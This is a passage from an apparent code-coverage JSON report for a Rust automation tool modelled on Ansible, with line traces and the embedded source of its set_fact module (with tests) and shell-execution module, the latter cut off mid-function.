4],"length":1,"stats":{"Line":0}},{"line":267,"address":[31149117,31149598],"length":1,"stats":{"Line":0}},{"line":275,"address":[23904368],"length":1,"stats":{"Line":0}},{"line":281,"address":[31129571,31128552,31128171],"length":1,"stats":{"Line":0}},{"line":282,"address":[31128733,31128831,31129539],"length":1,"stats":{"Line":0}},{"line":283,"address":[31129490,31129019,31129132],"length":1,"stats":{"Line":0}},{"line":284,"address":[31129277],"length":1,"stats":{"Line":0}},{"line":286,"address":[31129795,31129347,31129947,31129432,31129871,31130457],"length":1,"stats":{"Line":0}},{"line":287,"address":[25966831],"length":1,"stats":{"Line":0}},{"line":288,"address":[31129837,31147296],"length":1,"stats":{"Line":0}},{"line":289,"address":[31147310],"length":1,"stats":{"Line":0}},{"line":292,"address":[31130008],"length":1,"stats":{"Line":0}},{"line":293,"address":[31130015],"length":1,"stats":{"Line":0}},{"line":296,"address":[31130038,31130098,31130181],"length":1,"stats":{"Line":0}},{"line":297,"address":[31130198,31130907],"length":1,"stats":{"Line":0}},{"line":298,"address":[31130250,31130433],"length":1,"stats":{"Line":0}},{"line":300,"address":[31130476,31130320,31130219,31128252,31131266],"length":1,"stats":{"Line":0}},{"line":301,"address":[31130822],"length":1,"stats":{"Line":0}},{"line":302,"address":[31130900],"length":1,"stats":{"Line":0}},{"line":307,"address":[31130920,31130055],"length":1,"stats":{"Line":0}},{"line":308,"address":[31131017,31130932],"length":1,"stats":{"Line":0}},{"line":309,"address":[31132413,31131302,31128273,31131031],"length":1,"stats":{"Line":0}},{"line":312,"address":[31131667],"length":1,"stats":{"Line":0}},{"line":313,"address":[31131693,31132408],"length":1,"stats":{"Line":0}},{"line":314,"address":[31132089,31131733],"length":1,"stats":{"Line":0}},{"line":315,"address":[31132153],"length":1,"stats":{"Line":0}},{"line":316,"address":[31132401],"length":1,"stats":{"Line":0}},{"line":318,"address":[31131759,31131714],"length":1,"stats":{"Line":0}},{"line":319,"address":[31134355,31132593,31132031,31131827,31132687,31132763],"length":1,"stats":{"Line":0}},{"line":321,"address":[31132426,31132657,31132977,31132016,31132731,31132064,31128294],"length":1,"stats":{"Line":0}},{"line":323,"address":[31133047],"length":1,"stats":{"Line":0}},{"line":324,"address":[31133217,31133061],"length":1,"stats":{"Line":0}},{"line":330,"address":[31133142,31133533],"length":1,"stats":{"Line":0}},{"line":331,"address":[31133703],"length":1,"stats":{"Line":0}},{"line":338,"address":[31133740,31130968],"length":1,"stats":{"Line":0}},{"line":339,"address":[31133773,31134327,31133901],"length":1,"stats":{"Line":0}},{"line":340,"address":[31137316,31128315,31134061,31134368],"length":1,"stats":{"Line":0}},{"line":342,"address":[31134735],"length":1,"stats":{"Line":0}},{"line":344,"address":[31134781],"length":1,"stats":{"Line":0}},{"line":345,"address":[31134875],"length":1,"stats":{"Line":0}},{"line":346,"address":[31134986,31135300],"length":1,"stats":{"Line":0}},{"line":347,"address":[31135435],"length":1,"stats":{"Line":0}},{"line":350,"address":[31134955],"length":1,"stats":{"Line":0}},{"line":351,"address":[31135075],"length":1,"stats":{"Line":0}},{"line":352,"address":[31135092],"length":1,"stats":{"Line":0}},{"line":354,"address":[31135167],"length":1,"stats":{"Line":0}},{"line":356,"address":[25966936],"length":1,"stats":{"Line":0}},{"line":358,"address":[31137950],"length":1,"stats":{"Line":0}},{"line":359,"address":[31138068,31137964],"length":1,"stats":{"Line":0}},{"line":365,"address":[31138333,31138019],"length":1,"stats":{"Line":0}},{"line":366,"address":[31138468],"length":1,"stats":{"Line":0}},{"line":369,"address":[31135468,31134898],"length":1,"stats":{"Line":0}},{"line":374,"address":[31134794],"length":1,"stats":{"Line":0}},{"line":375,"address":[31135662,31136311],"length":1,"stats":{"Line":0}},{"line":376,"address":[31135855,31136169],"length":1,"stats":{"Line":0}},{"line":377,"address":[31136304],"length":1,"stats":{"Line":0}},{"line":380,"address":[31135824],"length":1,"stats":{"Line":0}},{"line":381,"address":[31135944],"length":1,"stats":{"Line":0}},{"line":382,"address":[31135961],"length":1,"stats":{"Line":0}},{"line":384,"address":[31136036],"length":1,"stats":{"Line":0}},{"line":386,"address":[31138741,31139061,31128357,31138815,31138510,31136096,31136144],"length":1,"stats":{"Line":0}},{"line":388,"address":[31139131],"length":1,"stats":{"Line":0}},{"line":389,"address":[31139145,31139249],"length":1,"stats":{"Line":0}},{"line":395,"address":[31139200,31139514],"length":1,"stats":{"Line":0}},{"line":396,"address":[31139649],"length":1,"stats":{"Line":0}},{"line":399,"address":[31135608,31135684],"length":1,"stats":{"Line":0}},{"line":404,"address":[31134815,31136811],"length":1,"stats":{"Line":0}},{"line":405,"address":[31136355,31136669],"length":1,"stats":{"Line":0}},{"line":406,"address":[31136804],"length":1,"stats":{"Line":0}},{"line":409,"address":[31136324],"length":1,"stats":{"Line":0}},{"line":410,"address":[31136444],"length":1,"stats":{"Line":0}},{"line":411,"address":[31136461],"length":1,"stats":{"Line":0}},{"line":413,"address":[31136536],"length":1,"stats":{"Line":0}},{"line":415,"address":[25966978],"length":1,"stats":{"Line":0}},{"line":417,"address":[31140312],"length":1,"stats":{"Line":0}},{"line":418,"address":[31140326,31140430],"length":1,"stats":{"Line":0}},{"line":424,"address":[31140695,31140381],"length":1,"stats":{"Line":0}},{"line":425,"address":[31140830],"length":1,"stats":{"Line":0}},{"line":430,"address":[31134845,31137311],"length":1,"stats":{"Line":0}},{"line":431,"address":[31136855,31137169],"length":1,"stats":{"Line":0}},{"line":432,"address":[31137304],"length":1,"stats":{"Line":0}},{"line":435,"address":[31136824],"length":1,"stats":{"Line":0}},{"line":436,"address":[31136944],"length":1,"stats":{"Line":0}},{"line":437,"address":[31136961],"length":1,"stats":{"Line":0}},{"line":439,"address":[31137036],"length":1,"stats":{"Line":0}},{"line":441,"address":[25966999],"length":1,"stats":{"Line":0}},{"line":443,"address":[31141506],"length":1,"stats":{"Line":0}},{"line":445,"address":[31141612,31141520],"length":1,"stats":{"Line":0}},{"line":447,"address":[31141690],"length":1,"stats":{"Line":0}},{"line":448,"address":[31142076],"length":1,"stats":{"Line":0}},{"line":450,"address":[31142143],"length":1,"stats":{"Line":0}},{"line":452,"address":[31142587,31142199,31142282,31128420,31142513,31142833,31142247],"length":1,"stats":{"Line":0}},{"line":453,"address":[31142903],"length":1,"stats":{"Line":0}},{"line":454,"address":[31142917,31142986],"length":1,"stats":{"Line":0}},{"line":460,"address":[31141626,31141724],"length":1,"stats":{"Line":0}},{"line":467,"address":[31143251,31141556],"length":1,"stats":{"Line":0}},{"line":468,"address":[31143386],"length":1,"stats":{"Line":0}},{"line":474,"address":[31133804,31143463,31143778],"length":1,"stats":{"Line":0}},{"line":475,"address":[31143516,31143656],"length":1,"stats":{"Line":0}},{"line":477,"address":[31143571,31143477],"length":1,"stats":{"Line":0}},{"line":481,"address":[31143846,31146671,31143625],"length":1,"stats":{"Line":0}},{"line":482,"address":[31143891,31144694,31144308,31144197,31144748,31144797],"length":1,"stats":{"Line":0}},{"line":483,"address":[31144726,31144293,31128441,31144341,31144530],"length":1,"stats":{"Line":0}},{"line":485,"address":[31144946,31144802,31145170,31145241],"length":1,"stats":{"Line":0}},{"line":486,"address":[31145006,31144931,31144979,31145202,31128462],"length":1,"stats":{"Line":0}},{"line":488,"address":[31145667,31145604,31145951,31145303,31145258,31145376],"length":1,"stats":{"Line":0}},{"line":493,"address":[31146241,31144105,31143957,31143860,31146170],"length":1,"stats":{"Line":0}},{"line":494,"address":[31128483,31144138,31146003,31146202,31144090],"length":1,"stats":{"Line":0}},{"line":496,"address":[31147187,31146369,31146303,31146258],"length":1,"stats":{"Line":0}},{"line":501,"address":[31145933,31147112],"length":1,"stats":{"Line":0}},{"line":502,"address":[31146752,31147003],"length":1,"stats":{"Line":0}},{"line":504,"address":[31146684,31146856],"length":1,"stats":{"Line":0}},{"line":509,"address":[23904208],"length":1,"stats":{"Line":0}},{"line":515,"address":[31122123,31121200,31121032],"length":1,"stats":{"Line":0}},{"line":516,"address":[31121476,31121381,31122094],"length":1,"stats":{"Line":0}},{"line":517,"address":[31121661,31121774,31122045],"length":1,"stats":{"Line":0}},{"line":519,"address":[25962092],"length":1,"stats":{"Line":0}},{"line":520,"address":[31122401],"length":1,"stats":{"Line":0}},{"line":521,"address":[31122441],"length":1,"stats":{"Line":0}},{"line":524,"address":[31123010,31122900,31122530,31122676,31122418,31122951],"length":1,"stats":{"Line":0}},{"line":525,"address":[31121110,31122739,31122661,31122932,31122706],"length":1,"stats":{"Line":0}},{"line":527,"address":[31123015,31123061],"length":1,"stats":{"Line":0}},{"line":528,"address":[31123255,31123470,31123538,31123071,31123150],"length":1,"stats":{"Line":0}},{"line":529,"address":[31123288,31123312,31121131,31123502,31123240],"length":1,"stats":{"Line":0}},{"line":532,"address":[31123053],"length":1,"stats":{"Line":0}},{"line":535,"address":[31123094],"length":1,"stats":{"Line":0}},{"line":536,"address":[31123552],"length":1,"stats":{"Line":0}},{"line":538,"address":[31123764,31123623],"length":1,"stats":{"Line":0}},{"line":540,"address":[31123899],"length":1,"stats":{"Line":0}},{"line":541,"address":[31124078,31123976],"length":1,"stats":{"Line":0}},{"line":542,"address":[31124237],"length":1,"stats":{"Line":0}},{"line":543,"address":[31124256],"length":1,"stats":{"Line":0}},{"line":544,"address":[31124266],"length":1,"stats":{"Line":0}},{"line":545,"address":[31124284],"length":1,"stats":{"Line":0}},{"line":547,"address":[31124370],"length":1,"stats":{"Line":0}},{"line":549,"address":[31124296],"length":1,"stats":{"Line":0}},{"line":552,"address":[31124001,31124781],"length":1,"stats":{"Line":0}},{"line":555,"address":[31124551,31125008],"length":1,"stats":{"Line":0}},{"line":556,"address":[31125120],"length":1,"stats":{"Line":0}},{"line":558,"address":[31125046],"length":1,"stats":{"Line":0}},{"line":561,"address":[31125282],"length":1,"stats":{"Line":0}},{"line":562,"address":[31125417],"length":1,"stats":{"Line":0}},{"line":564,"address":[31125328,31125353],"length":1,"stats":{"Line":0}},{"line":567,"address":[31125640],"length":1,"stats":{"Line":0}},{"line":569,"address":[31125576,31125334],"length":1,"stats":{"Line":0}},{"line":574,"address":[31125844,31125014],"length":1,"stats":{"Line":0}},{"line":575,"address":[31125884,31125972],"length":1,"stats":{"Line":0}},{"line":577,"address":[31126084,31126028,31126245],"length":1,"stats":{"Line":0}},{"line":578,"address":[31126201],"length":1,"stats":{"Line":0}},{"line":580,"address":[31126090,31126247],"length":1,"stats":{"Line":0}},{"line":586,"address":[23902208],"length":1,"stats":{"Line":1}},{"line":590,"address":[23901520],"length":1,"stats":{"Line":0}},{"line":594,"address":[23901552],"length":1,"stats":{"Line":1}},{"line":598,"address":[23901568],"length":1,"stats":{"Line":1}},{"line":602,"address":[23903390,23902672,23903364],"length":1,"stats":{"Line":0}},{"line":608,"address":[23902736,23902875],"length":1,"stats":{"Line":0}},{"line":609,"address":[31115279],"length":1,"stats":{"Line":0}},{"line":610,"address":[31115246],"length":1,"stats":{"Line":0}},{"line":615,"address":[23903124,23903043,23902944],"length":1,"stats":{"Line":0}},{"line":616,"address":[23903020,23903092],"length":1,"stats":{"Line":0}},{"line":618,"address":[23903294,23903212],"length":1,"stats":{"Line":0}},{"line":621,"address":[23902646,23902240,23902640],"length":1,"stats":{"Line":0}},{"line":626,"address":[23902576],"length":1,"stats":{"Line":0}},{"line":629,"address":[23901600,23902171,23902177],"length":1,"stats":{"Line":0}},{"line":631,"address":[23901663],"length":1,"stats":{"Line":0}},{"line":632,"address":[23901721],"length":1,"stats":{"Line":0}},{"line":633,"address":[23901789],"length":1,"stats":{"Line":0}},{"line":637,"address":[23901765,23901873],"length":1,"stats":{"Line":0}},{"line":638,"address":[23901971],"length":1,"stats":{"Line":0}},{"line":639,"address":[23901906],"length":1,"stats":{"Line":0}},{"line":642,"address":[23902019,23902101],"length":1,"stats":{"Line":0}}],"covered":10,"coverable":266},{"path":["/","home","artur","Repositories","rustible","src","modules","set_fact.rs"],"content":"//! Set_fact module - Set host variables dynamically during playbook execution\n//!\n//! This module allows you to set variables (facts) on hosts during playbook execution.\n//! Unlike gathered facts from the setup module, these are user-defined variables that\n//! persist for the duration of the play and can be used in subsequent tasks.\n\nuse super::{\n    Module, ModuleClassification, ModuleContext, ModuleError, ModuleOutput, ModuleParams,\n    ModuleResult, ParallelizationHint,\n};\nuse serde_json::Value;\nuse std::collections::HashMap;\n\n/// Module for setting host facts/variables dynamically\npub struct SetFactModule;\n\nimpl Module for SetFactModule {\n    fn name(\u0026self) -\u003e \u0026'static str {\n        \"set_fact\"\n    }\n\n    fn description(\u0026self) -\u003e \u0026'static str {\n        \"Set host variables (facts) that persist for the duration of the play\"\n    }\n\n    fn classification(\u0026self) -\u003e ModuleClassification {\n        // LocalLogic because this runs entirely on the control node\n        // It doesn't need to connect to the remote host, just updates the runtime context\n        ModuleClassification::LocalLogic\n    }\n\n    fn parallelization_hint(\u0026self) -\u003e ParallelizationHint {\n        // Can run in parallel since each host gets its own variables\n        ParallelizationHint::FullyParallel\n    }\n\n    fn required_params(\u0026self) -\u003e \u0026[\u0026'static str] {\n        // No required params - all key=value pairs become facts\n        // At least one fact must be provided, but we validate that separately\n        \u0026[]\n    }\n\n    fn optional_params(\u0026self) -\u003e HashMap\u003c\u0026'static str, Value\u003e {\n        let mut params = HashMap::new();\n        params.insert(\"cacheable\", Value::Bool(false));\n        params\n    }\n\n    fn validate_params(\u0026self, params: \u0026ModuleParams) -\u003e ModuleResult\u003c()\u003e {\n        // Must have at least one parameter that's not 'cacheable'\n        let fact_count = params.keys().filter(|k| k.as_str() != \"cacheable\").count();\n\n        if fact_count == 0 {\n            return Err(ModuleError::InvalidParameter(\n                \"set_fact requires at least one key=value pair to set\".to_string(),\n            ));\n        }\n\n        // Validate cacheable if present\n        if let Some(cacheable) = params.get(\"cacheable\") {\n            match cacheable {\n                Value::Bool(_) =\u003e {}\n                Value::String(s) =\u003e {\n                    let lower = s.to_lowercase();\n                    if ![\"true\", \"false\", \"yes\", \"no\", \"1\", \"0\"].contains(\u0026lower.as_str()) {\n                        return Err(ModuleError::InvalidParameter(\n                            \"cacheable must be a boolean value\".to_string(),\n                        ));\n                    }\n                }\n                _ =\u003e {\n                    return Err(ModuleError::InvalidParameter(\n                        \"cacheable must be a boolean value\".to_string(),\n                    ));\n                }\n            }\n        }\n\n        Ok(())\n    }\n\n    fn execute(\n        \u0026self,\n        params: \u0026ModuleParams,\n        _context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // Note: The actual variable setting happens in the executor (execute_set_fact)\n        // because this module needs to modify the RuntimeContext, which isn't\n        // directly accessible from the Module trait.\n        //\n        // This module implementation serves as documentation and validation,\n        // and returns a structured result that the executor can use.\n\n        let cacheable = match params.get(\"cacheable\") {\n            Some(Value::Bool(b)) =\u003e *b,\n            Some(Value::String(s)) =\u003e {\n                let lower = s.to_lowercase();\n                [\"true\", \"yes\", \"1\"].contains(\u0026lower.as_str())\n            }\n            _ =\u003e false,\n        };\n\n        let mut facts_set = Vec::new();\n        let mut data = HashMap::new();\n\n        // Collect all facts being set (excluding cacheable)\n        for (key, value) in params {\n            if key != \"cacheable\" {\n                facts_set.push(key.clone());\n                data.insert(key.clone(), value.clone());\n            }\n        }\n\n        let message = if facts_set.len() == 1 {\n            format!(\"Set fact: {}\", facts_set[0])\n        } else {\n            format!(\"Set {} facts: {}\", facts_set.len(), facts_set.join(\", \"))\n        };\n\n        // set_fact never actually changes the system state, but by Ansible convention\n        // it's reported as \"ok\" not \"changed\"\n        let mut output = ModuleOutput::ok(message);\n        output.data = data;\n\n        if cacheable {\n            output\n                .data\n                .insert(\"cacheable\".to_string(), Value::Bool(true));\n        }\n\n        Ok(output)\n    }\n\n    fn check(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // set_fact behaves the same in check mode - it still sets the variables\n        // This is intentional because subsequent tasks may depend on these variables\n        self.execute(params, context)\n    }\n\n    fn diff(\n        \u0026self,\n        _params: \u0026ModuleParams,\n        _context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cOption\u003csuper::Diff\u003e\u003e {\n        // set_fact doesn't produce diffs since it's not changing files\n        Ok(None)\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_set_fact_validation() {\n        let module = SetFactModule;\n\n        // Valid: single fact\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"my_var\".to_string(), Value::String(\"value\".to_string()));\n        assert!(module.validate_params(\u0026params).is_ok());\n\n        // Valid: multiple facts\n        params.insert(\"another_var\".to_string(), Value::Number(42.into()));\n        assert!(module.validate_params(\u0026params).is_ok());\n\n        // Valid: with cacheable\n        params.insert(\"cacheable\".to_string(), Value::Bool(true));\n        assert!(module.validate_params(\u0026params).is_ok());\n\n        // Invalid: no facts\n        let empty_params: ModuleParams = HashMap::new();\n        assert!(module.validate_params(\u0026empty_params).is_err());\n\n        // Invalid: only cacheable\n        let mut cacheable_only: ModuleParams = HashMap::new();\n        cacheable_only.insert(\"cacheable\".to_string(), Value::Bool(true));\n        assert!(module.validate_params(\u0026cacheable_only).is_err());\n    }\n\n    #[test]\n    fn test_set_fact_execute() {\n        let module = SetFactModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"my_fact\".to_string(),\n            Value::String(\"test_value\".to_string()),\n        );\n        params.insert(\"number_fact\".to_string(), Value::Number(100.into()));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed); // set_fact doesn't mark as changed\n        assert!(result.msg.contains(\"Set 2 facts\"));\n        assert!(result.data.contains_key(\"my_fact\"));\n        assert!(result.data.contains_key(\"number_fact\"));\n    }\n\n    #[test]\n    fn test_set_fact_with_cacheable() {\n        let module = SetFactModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"cached_var\".to_string(),\n            Value::String(\"cached\".to_string()),\n        );\n        params.insert(\"cacheable\".to_string(), Value::Bool(true));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n        assert!(result.data.contains_key(\"cached_var\"));\n        assert_eq!(result.data.get(\"cacheable\"), Some(\u0026Value::Bool(true)));\n    }\n\n    #[test]\n    fn test_set_fact_check_mode() {\n        let module = SetFactModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"my_fact\".to_string(), Value::String(\"value\".to_string()));\n\n        let context = ModuleContext::default().with_check_mode(true);\n        let result = module.check(\u0026params, \u0026context).unwrap();\n\n        // In check mode, set_fact still works\n        assert!(!result.changed);\n        assert!(result.data.contains_key(\"my_fact\"));\n    }\n\n    #[test]\n    fn test_set_fact_complex_values() {\n        let module = SetFactModule;\n        let mut params: ModuleParams = HashMap::new();\n\n        // Dictionary value\n        let dict_value = serde_json::json!({\n            \"key1\": \"value1\",\n            \"key2\": 42,\n            \"nested\": {\n                \"inner\": true\n            }\n        });\n        params.insert(\"dict_fact\".to_string(), dict_value);\n\n        // List value\n        let list_value = serde_json::json!([\"item1\", \"item2\", \"item3\"]);\n        params.insert(\"list_fact\".to_string(), list_value);\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n        assert!(result.data.contains_key(\"dict_fact\"));\n        assert!(result.data.contains_key(\"list_fact\"));\n    }\n\n    #[test]\n    fn test_set_fact_module_classification() {\n        let module = SetFactModule;\n        assert_eq!(module.classification(), ModuleClassification::LocalLogic);\n        assert_eq!(\n            module.parallelization_hint(),\n            ParallelizationHint::FullyParallel\n        );\n    }\n}\n","traces":[{"line":18,"address":[29981296],"length":1,"stats":{"Line":0}},{"line":22,"address":[29980000],"length":1,"stats":{"Line":0}},{"line":26,"address":[29980032],"length":1,"stats":{"Line":1}},{"line":32,"address":[29981200],"length":1,"stats":{"Line":1}},{"line":37,"address":[29980240],"length":1,"stats":{"Line":0}},{"line":43,"address":[29980048,29980221,29980215],"length":1,"stats":{"Line":0}},{"line":44,"address":[29980083],"length":1,"stats":{"Line":0}},{"line":45,"address":[29980093,29980166],"length":1,"stats":{"Line":0}},{"line":46,"address":[29980187],"length":1,"stats":{"Line":0}},{"line":49,"address":[29981178,29980256,29981172],"length":1,"stats":{"Line":1}},{"line":51,"address":[26675664,26675678],"length":1,"stats":{"Line":3}},{"line":53,"address":[29980345],"length":1,"stats":{"Line":1}},{"line":54,"address":[29980386],"length":1,"stats":{"Line":1}},{"line":55,"address":[29980355],"length":1,"stats":{"Line":1}},{"line":60,"address":[29980578,29980506],"length":1,"stats":{"Line":2}},{"line":61,"address":[29980599],"length":1,"stats":{"Line":1}},{"line":63,"address":[29980806],"length":1,"stats":{"Line":0}},{"line":64,"address":[29980818],"length":1,"stats":{"Line":0}},{"line":65,"address":[29980924,29980853],"length":1,"stats":{"Line":0}},{"line":66,"address":[29981040],"length":1,"stats":{"Line":0}},{"line":67,"address":[29980985],"length":1,"stats":{"Line":0}},{"line":72,"address":[29980683],"length":1,"stats":{"Line":0}},{"line":73,"address":[29980652],"length":1,"stats":{"Line":0}},{"line":79,"address":[29980637],"length":1,"stats":{"Line":1}},{"line":82,"address":[29981844,29981850,29981376],"length":1,"stats":{"Line":1}},{"line":94,"address":[29981442],"length":1,"stats":{"Line":1}},{"line":95,"address":[29981562],"length":1,"stats":{"Line":1}},{"line":96,"address":[29981599],"length":1,"stats":{"Line":0}},{"line":97,"address":[29981619],"length":1,"stats":{"Line":0}},{"line":98,"address":[29981654,29981761],"length":1,"stats":{"Line":0}},{"line":100,"address":[29981552],"length":1,"stats":{"Line":1}},{"line":103,"address":[29981671],"length":1,"stats":{"Line":1}},{"line":104,"address":[29981688],"length":1,"stats":{"Line":1}},{"line":107,"address":[29981912,29981977],"length":1,"stats":{"Line":2}},{"line":108,"address":[29982126,29983228],"length":1,"stats":{"Line":2}},{"line":109,"address":[29983237],"length":1,"stats":{"Line":1}},{"line":110,"address":[29983291,29983346],"length":1,"stats":{"Line":1}},{"line":114,"address":[29982159],"length":1,"stats":{"Line":1}},{"line":115,"address":[29982261,29982194],"length":1,"stats":{"Line":2}},{"line":117,"address":[29982229,29982453],"length":1,"stats":{"Line":2}},{"line":122,"address":[29982390],"length":1,"stats":{"Line":1}},{"line":123,"address":[29982794,29982869],"length":1,"stats":{"Line":1}},{"line":125,"address":[29982962],"length":1,"stats":{"Line":1}},{"line":126,"address":[29983062],"length":1,"stats":{"Line":1}},{"line":128,"address":[29983075,29983151],"length":1,"stats":{"Line":2}},{"line":131,"address":[29982972],"length":1,"stats":{"Line":1}},{"line":134,"address":[29981328],"length":1,"stats":{"Line":1}},{"line":137,"address":[29981355],"length":1,"stats":{"Line":1}},{"line":140,"address":[29981216],"length":1,"stats":{"Line":0}},{"line":146,"address":[29981242],"length":1,"stats":{"Line":0}}],"covered":31,"coverable":50},{"path":["/","home","artur","Repositories","rustible","src","modules","shell.rs"],"content":"//! Shell module - Execute shell commands\n//!\n//! This module executes commands through a shell, enabling shell features\n//! like pipes, redirects, environment variable expansion, etc.\n//!\n//! Supports both local execution (using std::process::Command) and remote\n//! execution via async connections (SSH, Docker, etc.).\n\nuse super::{\n    Diff, Module, ModuleClassification, ModuleContext, ModuleError, ModuleOutput, ModuleParams,\n    ModuleResult, ParamExt,\n};\nuse crate::connection::{Connection, ExecuteOptions};\nuse std::path::Path;\nuse std::process::Command;\nuse std::sync::Arc;\n\n/// Module for executing shell commands\npub struct ShellModule;\n\nimpl ShellModule {\n    /// Get shell executable and flag for local execution\n    fn get_shell(\u0026self, params: \u0026ModuleParams) -\u003e ModuleResult\u003c(String, String)\u003e {\n        // Get shell executable\n        let executable = params\n            .get_string(\"executable\")?\n            .unwrap_or_else(|| \"/bin/sh\".to_string());\n\n        // Different shells have different syntax for running commands\n        let flag = if executable.ends_with(\"fish\") {\n            \"-c\".to_string()\n        } else if executable.ends_with(\"cmd.exe\") || executable.ends_with(\"cmd\") {\n            \"/c\".to_string()\n        } else {\n            \"-c\".to_string()\n        };\n\n        Ok((executable, flag))\n    }\n\n    /// Build the full shell command for remote execution\n    fn build_shell_command(\u0026self, cmd: \u0026str, params: \u0026ModuleParams) -\u003e ModuleResult\u003cString\u003e {\n        let executable = params\n            .get_string(\"executable\")?\n            .unwrap_or_else(|| \"/bin/sh\".to_string());\n\n        // Different shells have different syntax for running commands\n        let flag = if executable.ends_with(\"fish\") {\n            \"-c\"\n        } else if executable.ends_with(\"cmd.exe\") || executable.ends_with(\"cmd\") {\n            \"/c\"\n        } else {\n            \"-c\"\n        };\n\n        // Escape the command for shell execution\n        let escaped_cmd = cmd.replace('\\'', \"'\\\\''\");\n        Ok(format!(\"{} {} '{}'\", executable, flag, escaped_cmd))\n    }\n\n    /// Build ExecuteOptions from params for remote execution\n    fn build_execute_options(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cExecuteOptions\u003e {\n        let mut options = ExecuteOptions::new();\n\n        // Set working directory\n        if let Some(chdir) = params.get_string(\"chdir\")? {\n            options = options.with_cwd(chdir);\n        } else if let Some(ref work_dir) = context.work_dir {\n            options = options.with_cwd(work_dir.clone());\n        }\n\n        // Set environment variables\n        if let Some(serde_json::Value::Object(env)) = params.get(\"env\") {\n            for (key, value) in env {\n                if let serde_json::Value::String(v) = value {\n                    options = options.with_env(key, v);\n                }\n            }\n        }\n\n        // Set timeout\n        if let Some(timeout) = params.get_i64(\"timeout\")? {\n            if timeout \u003e 0 {\n                options = options.with_timeout(timeout as u64);\n            }\n        }\n\n        // Handle privilege escalation from context\n        if context.r#become {\n            options.escalate = true;\n            options.escalate_user = context.become_user.clone();\n            options.escalate_method = context.become_method.clone();\n        }\n\n        Ok(options)\n    }\n\n    /// Check creates/removes conditions locally\n    fn check_creates_removes_local(\n        \u0026self,\n        params: \u0026ModuleParams,\n    ) -\u003e ModuleResult\u003cOption\u003cModuleOutput\u003e\u003e {\n        // Check 'creates' - skip if file exists\n        if let Some(creates) = params.get_string(\"creates\")? {\n            if Path::new(\u0026creates).exists() {\n                return Ok(Some(ModuleOutput::ok(format!(\n                    \"Skipped, '{}' exists\",\n                    creates\n                ))));\n            }\n        }\n\n        // Check 'removes' - skip if file doesn't exist\n        if let Some(removes) = params.get_string(\"removes\")? {\n            if !Path::new(\u0026removes).exists() {\n                return Ok(Some(ModuleOutput::ok(format!(\n                    \"Skipped, '{}' does not exist\",\n                    removes\n                ))));\n            }\n        }\n\n        Ok(None)\n    }\n\n    /// Check creates/removes conditions on remote host\n    async fn check_creates_removes_remote(\n        \u0026self,\n        params: \u0026ModuleParams,\n        connection: \u0026Arc\u003cdyn Connection + Send + Sync\u003e,\n    ) -\u003e ModuleResult\u003cOption\u003cModuleOutput\u003e\u003e {\n        // Check 'creates' - skip if file exists\n        if let Some(creates) = params.get_string(\"creates\")? {\n            let exists = connection\n                .path_exists(Path::new(\u0026creates))\n                .await\n                .unwrap_or(false);\n            if exists {\n                return Ok(Some(ModuleOutput::ok(format!(\n                    \"Skipped, '{}' exists\",\n                    creates\n                ))));\n            }\n        }\n\n        // Check 'removes' - skip if file doesn't exist\n        if let Some(removes) = params.get_string(\"removes\")? {\n            let exists = connection\n                .path_exists(Path::new(\u0026removes))\n                .await\n                .unwrap_or(false);\n            if !exists {\n                return Ok(Some(ModuleOutput::ok(format!(\n                    \"Skipped, '{}' does not exist\",\n                    removes\n                ))));\n            }\n        }\n\n        Ok(None)\n    }\n\n    /// Execute shell command locally using std::process::Command\n    fn execute_local(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // Check creates/removes conditions\n        if let Some(output) = self.check_creates_removes_local(params)? {\n            return Ok(output);\n        }\n\n        let cmd = params.get_string_required(\"cmd\")?;\n\n        // In check mode, return what would happen\n        if context.check_mode {\n            return Ok(ModuleOutput::changed(format!(\n                \"Would execute shell command: {}\",\n                cmd\n            )));\n        }\n\n        let (shell, flag) = self.get_shell(params)?;\n\n        let mut command = Command::new(\u0026shell);\n        command.arg(\u0026flag).arg(\u0026cmd);\n\n        // Set working directory\n        if let Some(chdir) = params.get_string(\"chdir\")? {\n            command.current_dir(\u0026chdir);\n        } else if let Some(ref work_dir) = context.work_dir {\n            command.current_dir(work_dir);\n        }\n\n        // Set environment variables\n        if let Some(serde_json::Value::Object(env)) = params.get(\"env\") {\n            for (key, value) in env {\n                if let serde_json::Value::String(v) = value {\n                    command.env(key, v);\n                }\n            }\n        }\n\n        // Handle stdin\n        if let Some(stdin_data) = params.get_string(\"stdin\")? {\n            use std::io::Write;\n            use std::process::Stdio;\n\n            command.stdin(Stdio::piped());\n            command.stdout(Stdio::piped());\n            command.stderr(Stdio::piped());\n\n            let mut child = command.spawn().map_err(|e| {\n                ModuleError::ExecutionFailed(format!(\"Failed to spawn shell: {}\", e))\n            })?;\n\n            if let Some(ref mut stdin) = child.stdin {\n                stdin.write_all(stdin_data.as_bytes()).map_err(|e| {\n                    ModuleError::ExecutionFailed(format!(\"Failed to write to stdin: {}\", e))\n                })?;\n            }\n\n            let output = child.wait_with_output().map_err(|e| {\n                ModuleError::ExecutionFailed(format!(\"Failed to wait for command: {}\", e))\n            })?;\n\n            let stdout = String::from_utf8_lossy(\u0026output.stdout).to_string();\n            let stderr = String::from_utf8_lossy(\u0026output.stderr).to_string();\n            let rc = output.status.code().unwrap_or(-1);\n\n            if output.status.success() {\n                return Ok(ModuleOutput::changed(\n                    \"Shell command executed successfully\".to_string(),\n                )\n                .with_command_output(Some(stdout), Some(stderr), Some(rc)));\n            } else 